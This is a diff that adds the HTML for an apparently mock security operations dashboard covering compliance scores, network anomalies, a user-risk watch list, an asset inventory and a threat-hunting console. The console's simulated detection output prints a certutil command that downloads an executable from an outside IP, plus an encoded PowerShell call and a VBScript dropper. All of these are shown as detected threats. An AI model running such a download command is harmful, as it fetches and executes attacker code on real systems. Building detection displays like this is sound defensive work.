+                <div class="comp-bar"><div class="comp-fill" style="width:84%;background:var(--green);"></div></div>
+                <div class="comp-meta"><span>112/133 controls passing</span><span>Last assessed: 2025-01-10</span></div>
+              </div>
+              <div class="comp-framework">
+                <div class="comp-header"><div class="comp-name">ISO/IEC 27001:2022</div><div class="comp-pct" style="color:var(--green);">91%</div></div>
+                <div class="comp-bar"><div class="comp-fill" style="width:91%;background:var(--green);"></div></div>
+                <div class="comp-meta"><span>99/109 controls passing</span><span>Certification: Valid until Oct 2026</span></div>
+              </div>
+              <div class="comp-framework">
+                <div class="comp-header"><div class="comp-name">SOC 2 Type II</div><div class="comp-pct" style="color:var(--amber);">76%</div></div>
+                <div class="comp-bar"><div class="comp-fill" style="width:76%;background:var(--amber);"></div></div>
+                <div class="comp-meta"><span>Security / Availability / Confidentiality</span><span>Report due: Mar 2025</span></div>
+              </div>
+              <div class="comp-framework">
+                <div class="comp-header"><div class="comp-name">PCI-DSS v4.0</div><div class="comp-pct" style="color:var(--amber);">82%</div></div>
+                <div class="comp-bar"><div class="comp-fill" style="width:82%;background:var(--amber);"></div></div>
+                <div class="comp-meta"><span>Requirements 1-12 tracked</span><span>QSA audit: Scheduled Feb 14</span></div>
+              </div>
+              <div class="comp-framework">
+                <div class="comp-header"><div class="comp-name">GDPR / Data Privacy</div><div class="comp-pct" style="color:var(--green);">88%</div></div>
+                <div class="comp-bar"><div class="comp-fill" style="width:88%;background:var(--green);"></div></div>
+                <div class="comp-meta"><span>DPIA completed | DPO appointed</span><span>Last DPA review: 2025-01-08</span></div>
+              </div>
+              <div class="comp-framework" style="border-bottom:none;">
+                <div class="comp-header"><div class="comp-name">HIPAA / HITECH</div><div class="comp-pct" style="color:var(--cyan);">93%</div></div>
+                <div class="comp-bar"><div class="comp-fill" style="width:93%;background:var(--cyan);"></div></div>
+                <div class="comp-meta"><span>Administrative / Physical / Technical</span><span>BAA coverage: 100%</span></div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Open Findings + Controls -->
+          <div style="display:flex;flex-direction:column;gap:12px;">
+            <div class="card">
+              <div class="card-header">
+                <div class="card-title"><div class="dot red"></div>CRITICAL COMPLIANCE GAPS</div>
+              </div>
+              <div class="card-body" style="padding:8px 14px;">
+                <table class="data-table">
+                  <thead><tr><th>FINDING</th><th>FRAMEWORK</th><th>RISK</th><th>OWNER</th></tr></thead>
+                  <tbody>
+                    <tr><td style="font-size:11px;">MFA not enforced on 12 privileged accounts</td><td class="text-mono" style="font-size:10px;color:var(--cyan);">PCI-DSS 8.4</td><td><span class="sev sev-critical">CRIT</span></td><td class="text-muted" style="font-size:11px;">IT Ops</td></tr>
+                    <tr><td style="font-size:11px;">5 vendors without current security assessment</td><td class="text-mono" style="font-size:10px;color:var(--cyan);">ISO 15.1</td><td><span class="sev sev-critical">CRIT</span></td><td class="text-muted" style="font-size:11px;">Procurement</td></tr>
+                    <tr><td style="font-size:11px;">Data retention policy non-compliant for EU data</td><td class="text-mono" style="font-size:10px;color:var(--cyan);">GDPR Art.5</td><td><span class="sev sev-high">HIGH</span></td><td class="text-muted" style="font-size:11px;">Legal</td></tr>
+                    <tr><td style="font-size:11px;">Network segmentation gap in DEV environment</td><td class="text-mono" style="font-size:10px;color:var(--cyan);">PCI-DSS 1.3</td><td><span class="sev sev-critical">CRIT</span></td><td class="text-muted" style="font-size:11px;">NetSec</td></tr>
+                    <tr><td style="font-size:11px;">Incident response plan outdated (>12 months)</td><td class="text-mono" style="font-size:10px;color:var(--cyan);">NIST RS.PL</td><td><span class="sev sev-high">HIGH</span></td><td class="text-muted" style="font-size:11px;">SecOps</td></tr>
+                    <tr><td style="font-size:11px;">Penetration testing overdue by 60+ days</td><td class="text-mono" style="font-size:10px;color:var(--cyan);">SOC2 A1.2</td><td><span class="sev sev-high">HIGH</span></td><td class="text-muted" style="font-size:11px;">CISO</td></tr>
+                    <tr><td style="font-size:11px;">Log retention < 12 months on 4 systems</td><td class="text-mono" style="font-size:10px;color:var(--cyan);">PCI-DSS 10.7</td><td><span class="sev sev-critical">CRIT</span></td><td class="text-muted" style="font-size:11px;">IT Ops</td></tr>
+                    <tr><td style="font-size:11px;">Key management procedures not documented</td><td class="text-mono" style="font-size:10px;color:var(--cyan);">ISO 18.1</td><td><span class="sev sev-high">HIGH</span></td><td class="text-muted" style="font-size:11px;">SecArch</td></div></td></tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+            <div class="card">
+              <div class="card-header">
+                <div class="card-title"><div class="dot green"></div>SECURITY AWARENESS TRAINING</div>
+              </div>
+              <div class="card-body">
+                <div class="sparkline-row"><div class="sp-name">Phishing Simulations Passed</div><div class="sp-bar"><div class="sp-fill pf-green" style="width:84%"></div></div><div class="sp-val text-green">84%</div></div>
+                <div class="sparkline-row"><div class="sp-name">Annual Training Complete</div><div class="sp-bar"><div class="sp-fill pf-cyan" style="width:91%"></div></div><div class="sp-val text-cyan">91%</div></div>
+                <div class="sparkline-row"><div class="sp-name">Password Policy Compliance</div><div class="sp-bar"><div class="sp-fill pf-amber" style="width:76%"></div></div><div class="sp-val text-amber">76%</div></div>
+                <div class="sparkline-row"><div class="sp-name">MFA Enrollment</div><div class="sp-bar"><div class="sp-fill pf-green" style="width:89%"></div></div><div class="sp-val text-green">89%</div></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ════════════════════════════════════════
+           TAB: NETWORK
+      ════════════════════════════════════════ -->
+      <div class="tab-pane" id="tab-network">
+        <div class="page-header">
+          <div>
+            <div class="page-title">NETWORK SECURITY MONITORING</div>
+            <div class="page-subtitle">TRAFFIC ANALYSIS // ANOMALY DETECTION // FIREWALL EVENTS // IDS/IPS</div>
+          </div>
+        </div>
+
+        <div class="kpi-grid">
+          <div class="kpi-card info"><div class="kpi-label">TOTAL TRAFFIC (24H)</div><div class="kpi-value">14.7<span style="font-size:11px;font-weight:400;color:var(--text-muted);">TB</span></div><div class="kpi-delta up">▲ 12% vs avg</div></div>
+          <div class="kpi-card danger"><div class="kpi-label">BLOCKED CONNECTIONS</div><div class="kpi-value">847K</div><div class="kpi-delta up">▲ high volume</div></div>
+          <div class="kpi-card warning"><div class="kpi-label">FIREWALL ALERTS</div><div class="kpi-value">12,441</div><div class="kpi-delta up">▲ 34%</div></div>
+          <div class="kpi-card success"><div class="kpi-label">IPS BLOCKS</div><div class="kpi-value">3,217</div><div class="kpi-delta down">▼ normal</div></div>
+          <div class="kpi-card purple"><div class="kpi-label">ANOMALY EVENTS</div><div class="kpi-value">89</div><div class="kpi-delta up">▲ 21</div></div>
+          <div class="kpi-card blue"><div class="kpi-label">BANDWIDTH UTIL</div><div class="kpi-value">61<span style="font-size:11px;font-weight:400;color:var(--text-muted);">%</span></div><div class="kpi-delta neu">— nominal</div></div>
+        </div>
+
+        <div class="grid-2 section-gap">
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot cyan"></div>NETWORK TRAFFIC ANALYSIS — 24H</div>
+            </div>
+            <div class="card-body">
+              <div style="position:relative;height:200px;">
+                <canvas id="networkChart" role="img" aria-label="Network traffic line chart showing inbound and outbound traffic over 24 hours">Network traffic chart</canvas>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot amber"></div>TOP FIREWALL BLOCK CATEGORIES</div>
+            </div>
+            <div class="card-body">
+              <div style="position:relative;height:200px;">
+                <canvas id="firewallChart" role="img" aria-label="Horizontal bar chart showing top firewall block categories">Firewall blocks chart</canvas>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="grid-2 section-gap">
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot red"></div>NETWORK ANOMALY EVENTS</div>
+            </div>
+            <div class="card-body" style="padding:8px 14px;">
+              <table class="data-table">
+                <thead><tr><th>TIME</th><th>TYPE</th><th>SRC</th><th>DETAILS</th><th>RISK</th></tr></thead>
+                <tbody>
+                  <tr><td class="text-mono" style="font-size:10px;color:var(--text-muted);">14:19</td><td style="font-size:12px;font-weight:600;">DNS Tunneling</td><td class="text-mono text-amber" style="font-size:10px;">10.20.33.88</td><td class="text-muted" style="font-size:11px;">2.3GB via DNS TXT records to 93.184.x.x</td><td><span class="sev sev-critical">CRIT</span></td></tr>
+                  <tr><td class="text-mono" style="font-size:10px;color:var(--text-muted);">14:15</td><td style="font-size:12px;font-weight:600;">C2 Beacon Pattern</td><td class="text-mono text-amber" style="font-size:10px;">10.50.22.147</td><td class="text-muted" style="font-size:11px;">Regular 300s interval to TOR exit node</td><td><span class="sev sev-critical">CRIT</span></td></tr>
+                  <tr><td class="text-mono" style="font-size:10px;color:var(--text-muted);">14:11</td><td style="font-size:12px;font-weight:600;">Port Scan — Internal</td><td class="text-mono text-amber" style="font-size:10px;">10.1.44.12</td><td class="text-muted" style="font-size:11px;">SYN scan across 10.1.0.0/16 — 65,535 ports</td><td><span class="sev sev-high">HIGH</span></td></tr>
+                  <tr><td class="text-mono" style="font-size:10px;color:var(--text-muted);">13:47</td><td style="font-size:12px;font-weight:600;">Data Spike — 48GB FTP</td><td class="text-mono text-amber" style="font-size:10px;">10.0.15.44</td><td class="text-muted" style="font-size:11px;">Outbound FTP burst to RU IP 91.243.80.142</td><td><span class="sev sev-critical">CRIT</span></td></tr>
+                  <tr><td class="text-mono" style="font-size:10px;color:var(--text-muted);">13:22</td><td style="font-size:12px;font-weight:600;">Abnormal BGP Route</td><td class="text-mono" style="font-size:10px;color:var(--text-muted);">203.0.113.1</td><td class="text-muted" style="font-size:11px;">BGP route prefix hijack attempt detected</td><td><span class="sev sev-high">HIGH</span></td></tr>
+                  <tr><td class="text-mono" style="font-size:10px;color:var(--text-muted);">12:58</td><td style="font-size:12px;font-weight:600;">RDP Brute Force</td><td class="text-mono text-red" style="font-size:10px;">45.142.212.100</td><td class="text-muted" style="font-size:11px;">1,247 auth failures against jump server in 4h</td><td><span class="sev sev-high">HIGH</span></td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot green"></div>NETWORK STATISTICS</div>
+            </div>
+            <div class="card-body">
+              <div class="net-stat-row">
+                <div class="ns-label">🌐 Total Ingress</div>
+                <div class="ns-val">9.4 TB</div>
+                <div class="ns-delta up">▲ 12%</div>
+              </div>
+              <div class="net-stat-row">
+                <div class="ns-label">⬆ Total Egress</div>
+                <div class="ns-val">5.3 TB</div>
+                <div class="ns-delta up">▲ 8%</div>
+              </div>
+              <div class="net-stat-row">
+                <div class="ns-label">⬛ Blocked by Firewall</div>
+                <div class="ns-val text-red">847K</div>
+                <div class="ns-delta up">▲ 34%</div>
+              </div>
+              <div class="net-stat-row">
+                <div class="ns-label">🛡 IPS Signatures Active</div>
+                <div class="ns-val">44,217</div>
+                <div class="ns-delta down">▼ updated</div>
+              </div>
+              <div class="net-stat-row">
+                <div class="ns-label">🔗 Active Connections</div>
+                <div class="ns-val">124,887</div>
+                <div class="ns-delta down">▼ normal</div>
+              </div>
+              <div class="net-stat-row">
+                <div class="ns-label">🌍 Geo-Blocked Countries</div>
+                <div class="ns-val">47</div>
+                <div class="ns-delta neu">— unchanged</div>
+              </div>
+              <div class="net-stat-row">
+                <div class="ns-label">🔒 TLS Inspection Rate</div>
+                <div class="ns-val text-green">94%</div>
+                <div class="ns-delta down">▼ +2%</div>
+              </div>
+              <div class="net-stat-row">
+                <div class="ns-label">📡 Avg Latency (E-W)</div>
+                <div class="ns-val">0.8ms</div>
+                <div class="ns-delta down">▼ fast</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ════════════════════════════════════════
+           TAB: UEBA
+      ════════════════════════════════════════ -->
+      <div class="tab-pane" id="tab-ueba">
+        <div class="page-header">
+          <div>
+            <div class="page-title">USER & ENTITY BEHAVIOR ANALYTICS</div>
+            <div class="page-subtitle">INSIDER THREAT // ANOMALY DETECTION // RISK SCORING // BEHAVIORAL BASELINES</div>
+          </div>
+        </div>
+
+        <div class="kpi-grid" style="grid-template-columns:repeat(5,1fr);">
+          <div class="kpi-card danger"><div class="kpi-label">HIGH RISK USERS</div><div class="kpi-value">7</div><div class="kpi-delta up">▲ 2 new</div></div>
+          <div class="kpi-card warning"><div class="kpi-label">MEDIUM RISK</div><div class="kpi-value">24</div><div class="kpi-delta up">▲ 5</div></div>
+          <div class="kpi-card info"><div class="kpi-label">MONITORED USERS</div><div class="kpi-value">4,847</div><div class="kpi-delta neu">— all active</div></div>
+          <div class="kpi-card purple"><div class="kpi-label">ANOMALY EVENTS</div><div class="kpi-value">1,247</div><div class="kpi-delta up">▲ 18%</div></div>
+          <div class="kpi-card success"><div class="kpi-label">INSIDER INCIDENTS YTD</div><div class="kpi-value">3</div><div class="kpi-delta down">▼ vs 7 last yr</div></div>
+        </div>
+
+        <div class="grid-4-6 section-gap">
+          <!-- High risk users -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot red"></div>HIGH RISK USER WATCH LIST</div>
+            </div>
+            <div class="card-body">
+              <div class="ueba-user-card">
+                <div class="ueba-avatar" style="border-color:var(--red);color:var(--red);">DT</div>
+                <div class="ueba-info">
+                  <div class="ueba-name">D. Thompson</div>
+                  <div class="ueba-dept">Finance | Notice served 2025-01-10</div>
+                </div>
+                <div class="ueba-risk-score" style="color:var(--red);">94</div>
+              </div>
+              <div class="ueba-user-card">
+                <div class="ueba-avatar" style="border-color:var(--red);color:var(--red);">CP</div>
+                <div class="ueba-info">
+                  <div class="ueba-name">C. Parker</div>
+                  <div class="ueba-dept">Executive | PS execution anomaly</div>
+                </div>
+                <div class="ueba-risk-score" style="color:var(--red);">88</div>
+              </div>
+              <div class="ueba-user-card">
+                <div class="ueba-avatar" style="border-color:var(--red);color:var(--red);">LG</div>
+                <div class="ueba-info">
+                  <div class="ueba-name">L. Garcia</div>
+                  <div class="ueba-dept">IT Admin | Unusual AD changes</div>
+                </div>
+                <div class="ueba-risk-score" style="color:var(--red);">85</div>
+              </div>
+              <div class="ueba-user-card">
+                <div class="ueba-avatar" style="border-color:var(--amber);color:var(--amber);">MN</div>
+                <div class="ueba-info">
+                  <div class="ueba-name">M. Nakamura</div>
+                  <div class="ueba-dept">R&D | Bulk IP download pattern</div>
+                </div>
+                <div class="ueba-risk-score" style="color:var(--amber);">71</div>
+              </div>
+              <div class="ueba-user-card">
+                <div class="ueba-avatar" style="border-color:var(--amber);color:var(--amber);">RB</div>
+                <div class="ueba-info">
+                  <div class="ueba-name">R. Brown</div>
+                  <div class="ueba-dept">Sales | Off-hours SharePoint access</div>
+                </div>
+                <div class="ueba-risk-score" style="color:var(--amber);">68</div>
+              </div>
+              <div class="ueba-user-card">
+                <div class="ueba-avatar" style="border-color:var(--amber);color:var(--amber);">JW</div>
+                <div class="ueba-info">
+                  <div class="ueba-name">J. Wilson</div>
+                  <div class="ueba-dept">DevOps | Unusual cloud API calls</div>
+                </div>
+                <div class="ueba-risk-score" style="color:var(--amber);">62</div>
+              </div>
+              <div class="ueba-user-card">
+                <div class="ueba-avatar" style="border-color:var(--amber);color:var(--amber);">SL</div>
+                <div class="ueba-info">
+                  <div class="ueba-name">S. Liu</div>
+                  <div class="ueba-dept">Legal | Mass email to personal acc</div>
+                </div>
+                <div class="ueba-risk-score" style="color:var(--amber);">61</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Behavioral anomalies -->
+          <div style="display:flex;flex-direction:column;gap:12px;">
+            <div class="card">
+              <div class="card-header">
+                <div class="card-title"><div class="dot amber"></div>BEHAVIORAL ANOMALY CATEGORIES</div>
+              </div>
+              <div class="card-body">
+                <div style="position:relative;height:180px;">
+                  <canvas id="uebaChart" role="img" aria-label="Doughnut chart showing user behavior anomaly categories">UEBA categories chart</canvas>
+                </div>
+                <div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:10px;font-size:11px;font-family:var(--font-mono);">
+                  <span style="display:flex;align-items:center;gap:4px;"><span style="width:8px;height:8px;border-radius:2px;background:#ff3355;display:inline-block;"></span>Data Access 31%</span>
+                  <span style="display:flex;align-items:center;gap:4px;"><span style="width:8px;height:8px;border-radius:2px;background:#ffaa00;display:inline-block;"></span>Auth Anomaly 24%</span>
+                  <span style="display:flex;align-items:center;gap:4px;"><span style="width:8px;height:8px;border-radius:2px;background:#9966ff;display:inline-block;"></span>Privilege Abuse 19%</span>
+                  <span style="display:flex;align-items:center;gap:4px;"><span style="width:8px;height:8px;border-radius:2px;background:#00d4ff;display:inline-block;"></span>Network 15%</span>
+                  <span style="display:flex;align-items:center;gap:4px;"><span style="width:8px;height:8px;border-radius:2px;background:#00ff88;display:inline-block;"></span>Other 11%</span>
+                </div>
+              </div>
+            </div>
+            <div class="card">
+              <div class="card-header">
+                <div class="card-title"><div class="dot cyan"></div>RECENT UEBA ALERTS — D. THOMPSON</div>
+              </div>
+              <div class="card-body" style="padding:8px 14px;">
+                <div class="tl-item">
+                  <div class="tl-dot red"></div>
+                  <div class="tl-content"><div class="tl-time">2025-01-15 11:44</div><div class="tl-text">Accessed 847 customer records in financial DB. 12x above baseline. Possible exfiltration prep.</div></div>
+                </div>
+                <div class="tl-item">
+                  <div class="tl-dot red"></div>
+                  <div class="tl-content"><div class="tl-time">2025-01-15 09:22</div><div class="tl-text">USB device inserted on WORKST-FIN-008. 2.3GB copied. Device blocked by DLP policy.</div></div>
+                </div>
+                <div class="tl-item">
+                  <div class="tl-dot amber"></div>
+                  <div class="tl-content"><div class="tl-time">2025-01-14 22:14</div><div class="tl-text">Login from geolocation anomaly. Previous session: New York. New session: Frankfurt. 4h gap.</div></div>
+                </div>
+                <div class="tl-item" style="padding-bottom:0;">
+                  <div class="tl-dot amber"></div>
+                  <div class="tl-content"><div class="tl-time">2025-01-14 18:07</div><div class="tl-text">Mass email sent to personal Gmail (12 attachments, 340MB). DLP intercepted and quarantined.</div></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ════════════════════════════════════════
+           TAB: ASSETS
+      ════════════════════════════════════════ -->
+      <div class="tab-pane" id="tab-assets">
+        <div class="page-header">
+          <div>
+            <div class="page-title">ASSET INVENTORY & RISK MANAGEMENT</div>
+            <div class="page-subtitle">HARDWARE / SOFTWARE / CLOUD / CONTAINERS // RISK SCORING // PATCH STATUS</div>
+          </div>
+          <div style="display:flex;gap:8px;">
+            <button class="btn btn-amber">+ ADD ASSET</button>
+            <button class="btn btn-cyan">⬇ EXPORT CMDB</button>
+          </div>
+        </div>
+
+        <div class="kpi-grid">
+          <div class="kpi-card info"><div class="kpi-label">TOTAL ASSETS</div><div class="kpi-value">2,847</div></div>
+          <div class="kpi-card danger"><div class="kpi-label">HIGH RISK ASSETS</div><div class="kpi-value">147</div><div class="kpi-delta up">▲ 12</div></div>
+          <div class="kpi-card success"><div class="kpi-label">PATCH COMPLIANCE</div><div class="kpi-value">87%</div></div>
+          <div class="kpi-card warning"><div class="kpi-label">EOL / UNSUPPORTED</div><div class="kpi-value">34</div><div class="kpi-delta up">▲ critical</div></div>
+          <div class="kpi-card purple"><div class="kpi-label">CLOUD INSTANCES</div><div class="kpi-value">1,244</div></div>
+          <div class="kpi-card blue"><div class="kpi-label">CONTAINERS (K8s)</div><div class="kpi-value">4,841</div></div>
+        </div>
+
+        <div class="card section-gap">
+          <div class="card-header">
+            <div class="card-title"><div class="dot cyan"></div>CRITICAL ASSETS — RISK RANKED</div>
+            <div class="filter-bar" style="margin:0;">
+              <span class="filter-chip active">ALL</span>
+              <span class="filter-chip">SERVERS</span>
+              <span class="filter-chip">WORKSTATIONS</span>
+              <span class="filter-chip">NETWORK</span>
+              <span class="filter-chip">CLOUD</span>
+            </div>
+          </div>
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>HOSTNAME</th>
+                <th>TYPE</th>
+                <th>OS / PLATFORM</th>
+                <th>IP ADDRESS</th>
+                <th>OWNER</th>
+                <th>RISK SCORE</th>
+                <th>VULNS</th>
+                <th>LAST PATCH</th>
+                <th>STATUS</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td class="text-mono text-cyan" style="font-size:12px;">PROD-DB-01</td>
+                <td><span class="ioc-tag">DATABASE</span></td>
+                <td><span class="asset-os-badge">Ubuntu 22.04</span></td>
+                <td class="text-mono" style="font-size:11px;color:var(--text-secondary);">10.1.44.12</td>
+                <td class="text-muted" style="font-size:11px;">DataEng</td>
+                <td><span style="font-family:var(--font-display);font-size:16px;font-weight:700;color:var(--red);">98</span></td>
+                <td><span class="sev sev-critical">7 CRIT</span></td>
+                <td class="text-mono text-red" style="font-size:10px;">OVERDUE</td>
+                <td><span class="status status-open">Compromised</span></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan" style="font-size:12px;">DC-01</td>
+                <td><span class="ioc-tag purple">DOMAIN CTRL</span></td>
+                <td><span class="asset-os-badge">Win Server 2022</span></td>
+                <td class="text-mono" style="font-size:11px;color:var(--text-secondary);">10.0.1.1</td>
+                <td class="text-muted" style="font-size:11px;">IT Ops</td>
+                <td><span style="font-family:var(--font-display);font-size:16px;font-weight:700;color:var(--red);">91</span></td>
+                <td><span class="sev sev-critical">4 CRIT</span></td>
+                <td class="text-mono text-amber" style="font-size:10px;">2025-01-08</td>
+                <td><span class="status status-active">Elevated Risk</span></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan" style="font-size:12px;">VPN-GW-01</td>
+                <td><span class="ioc-tag amber">VPN GATEWAY</span></td>
+                <td><span class="asset-os-badge">FortiOS 7.2</span></td>
+                <td class="text-mono" style="font-size:11px;color:var(--text-secondary);">203.0.113.10</td>
+                <td class="text-muted" style="font-size:11px;">NetSec</td>
+                <td><span style="font-family:var(--font-display);font-size:16px;font-weight:700;color:var(--red);">89</span></td>
+                <td><span class="sev sev-critical">3 CRIT</span></td>
+                <td class="text-mono text-red" style="font-size:10px;">OVERDUE</td>
+                <td><span class="status status-active">Elevated Risk</span></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan" style="font-size:12px;">NGFW-CORE</td>
+                <td><span class="ioc-tag amber">FIREWALL</span></td>
+                <td><span class="asset-os-badge">PAN-OS 11.1</span></td>
+                <td class="text-mono" style="font-size:11px;color:var(--text-secondary);">10.0.0.1</td>
+                <td class="text-muted" style="font-size:11px;">NetSec</td>
+                <td><span style="font-family:var(--font-display);font-size:16px;font-weight:700;color:var(--red);">87</span></td>
+                <td><span class="sev sev-critical">2 CRIT</span></td>
+                <td class="text-mono text-amber" style="font-size:10px;">2025-01-12</td>
+                <td><span class="status status-mitigated">Mitigated</span></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan" style="font-size:12px;">WORKST-FIN-042</td>
+                <td><span class="ioc-tag">WORKSTATION</span></td>
+                <td><span class="asset-os-badge">Win 11 Pro</span></td>
+                <td class="text-mono" style="font-size:11px;color:var(--text-secondary);">10.50.22.147</td>
+                <td class="text-muted" style="font-size:11px;">Finance</td>
+                <td><span style="font-family:var(--font-display);font-size:16px;font-weight:700;color:var(--red);">86</span></td>
+                <td><span class="sev sev-high">5 HIGH</span></td>
+                <td class="text-mono text-amber" style="font-size:10px;">2025-01-10</td>
+                <td><span class="status status-active">Isolated</span></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan" style="font-size:12px;">SRV-EMAIL-01</td>
+                <td><span class="ioc-tag">MAIL SERVER</span></td>
+                <td><span class="asset-os-badge">Exchange 2019</span></td>
+                <td class="text-mono" style="font-size:11px;color:var(--text-secondary);">10.0.5.10</td>
+                <td class="text-muted" style="font-size:11px;">IT Ops</td>
+                <td><span style="font-family:var(--font-display);font-size:16px;font-weight:700;color:var(--amber);">74</span></td>
+                <td><span class="sev sev-high">3 HIGH</span></td>
+                <td class="text-mono text-green" style="font-size:10px;">2025-01-13</td>
+                <td><span class="status status-resolved">Normal</span></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan" style="font-size:12px;">DEV-CLUSTER-04</td>
+                <td><span class="ioc-tag purple">K8S NODE</span></td>
+                <td><span class="asset-os-badge">K8s 1.29 / RHEL9</span></td>
+                <td class="text-mono" style="font-size:11px;color:var(--text-secondary);">10.40.0.14</td>
+                <td class="text-muted" style="font-size:11px;">DevOps</td>
+                <td><span style="font-family:var(--font-display);font-size:16px;font-weight:700;color:var(--amber);">69</span></td>
+                <td><span class="sev sev-high">2 HIGH</span></td>
+                <td class="text-mono text-green" style="font-size:10px;">2025-01-14</td>
+                <td><span class="status status-resolved">Normal</span></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan" style="font-size:12px;">GITLAB-INT</td>
+                <td><span class="ioc-tag green">DEV PLATFORM</span></td>
+                <td><span class="asset-os-badge">GitLab EE 17.x</span></td>
+                <td class="text-mono" style="font-size:11px;color:var(--text-secondary);">10.0.8.22</td>
+                <td class="text-muted" style="font-size:11px;">Engineering</td>
+                <td><span style="font-family:var(--font-display);font-size:16px;font-weight:700;color:var(--amber);">58</span></td>
+                <td><span class="sev sev-medium">6 MED</span></td>
+                <td class="text-mono text-green" style="font-size:10px;">2025-01-14</td>
+                <td><span class="status status-patched">Patched</span></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- ════════════════════════════════════════
+           TAB: THREAT HUNTING
+      ════════════════════════════════════════ -->
+      <div class="tab-pane" id="tab-hunting">
+        <div class="page-header">
+          <div>
+            <div class="page-title">THREAT HUNTING WORKBENCH</div>
+            <div class="page-subtitle">KQL / YARA / SIGMA RULES // HYPOTHESIS-DRIVEN HUNTING // IOC PIVOTING</div>
+          </div>
+          <div style="display:flex;gap:8px;">
+            <button class="btn btn-amber">📚 HUNT LIBRARY</button>
+            <button class="btn btn-cyan">+ NEW HUNT</button>
+          </div>
+        </div>
+
+        <div class="grid-2 section-gap">
+          <!-- Terminal -->
+          <div>
+            <div class="hunt-terminal">
+              <div class="hunt-term-header">
+                <div class="term-dot red"></div>
+                <div class="term-dot amber"></div>
+                <div class="term-dot green"></div>
+                <span style="font-size:11px;color:var(--text-muted);margin-left:8px;font-family:var(--font-mono);">SENTINEL PRIME HUNT CONSOLE — KQL ENGINE v3.1</span>
+              </div>
+              <div class="hunt-term-body" id="huntTerminal">
+<span class="output">// HUNT-2024-047: Detecting Living-off-the-Land (LotL) techniques
+// Hypothesis: APT41 using LOLBins for evasion on Finance segment
+// Author: Ciprian Stefan Plesca | Priority: CRITICAL</span>
+
+<span class="prompt">sentinel&gt;</span> <span style="color:var(--green);">HUNT EXECUTE --query="LOLBIN_LATERAL_MOVE_APT41"</span>
+
+<span class="output">[ * ] Loading SIGMA rule: sigma/windows/proc_creation_lolbin_lateral.yml</span>
+<span class="output">[ * ] Correlating EDR telemetry (last 72h) on 1,847 endpoints...</span>
+<span class="output">[ * ] Cross-referencing APT41 TTP signatures from Mandiant feed...</span>
+<span class="output">[ ! ] MATCHES FOUND (7 hits across 3 hosts):</span>
+
+<span class="match">  HIT 1: WORKST-FIN-042 | 2025-01-15 14:11:22 UTC</span>
+<span class="output">          proc: powershell.exe -enc [BASE64_PAYLOAD_340B]</span>
+<span class="output">          parent: winword.exe (SUSPICIOUS)</span>
+<span class="output">          technique: T1059.001 | Confidence: 97%</span>
+
+<span class="match">  HIT 2: WORKST-FIN-042 | 2025-01-15 14:12:07 UTC</span>
+<span class="output">          proc: certutil.exe -urlcache -f http://185.220.101.47/p.exe</span>
+<span class="output">          parent: powershell.exe | T1105 Ingress Tool Transfer</span>
+<span class="output">          IoC matched: 185.220.101.47 (APT41 C2 - HIGH CONFIDENCE)</span>
+
+<span class="match">  HIT 3: WORKST-FIN-042 | 2025-01-15 14:12:44 UTC</span>
+<span class="output">          proc: wscript.exe executing VBScript dropper via LOLBin</span>
+<span class="output">          file: %TEMP%\windowsupdate.vbs (KNOWN MALICIOUS HASH)</span>
+
+<span class="output">[ ✓ ] Hunt complete. 7 hits → Auto-promoted to INC-2024-1848</span>
+<span class="output">[ ✓ ] YARA rule generated from artifacts. EDR updated across fleet.</span>
+
+<div class="cmd-line"><span class="prompt">sentinel&gt;</span> <input class="hunt-input" type="text" placeholder="Enter KQL query or hunt command..." id="huntInput"><span class="cursor-blink" style="color:var(--green);">█</span></div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Hunt library -->
+          <div style="display:flex;flex-direction:column;gap:12px;">
+            <div class="card">
+              <div class="card-header">
+                <div class="card-title"><div class="dot cyan"></div>ACTIVE HUNT HYPOTHESES</div>
+              </div>
+              <div class="card-body" style="padding:8px 14px;">
+                <table class="data-table">
+                  <thead><tr><th>HUNT ID</th><th>HYPOTHESIS</th><th>STATUS</th><th>FINDING</th></tr></thead>
+                  <tbody>
+                    <tr><td class="text-mono text-cyan" style="font-size:10px;">HUNT-047</td><td style="font-size:11px;">APT41 LotL — Finance</td><td><span class="status status-active">Active</span></td><td><span class="sev sev-critical">7 HITS</span></td></tr>
+                    <tr><td class="text-mono text-cyan" style="font-size:10px;">HUNT-046</td><td style="font-size:11px;">Kerberoasting in AD</td><td><span class="status status-active">Active</span></td><td><span class="sev sev-high">3 HITS</span></td></tr>
+                    <tr><td class="text-mono text-cyan" style="font-size:10px;">HUNT-045</td><td style="font-size:11px;">LSASS Mem Dump Pattern</td><td><span class="status status-resolved">Closed</span></td><td><span class="sev sev-critical">CONFIRMED</span></td></tr>
+                    <tr><td class="text-mono text-cyan" style="font-size:10px;">HUNT-044</td><td style="font-size:11px;">Cozy Bear Supply Chain</td><td><span class="status status-active">Active</span></td><td><span class="sev sev-medium">PENDING</span></td></tr>
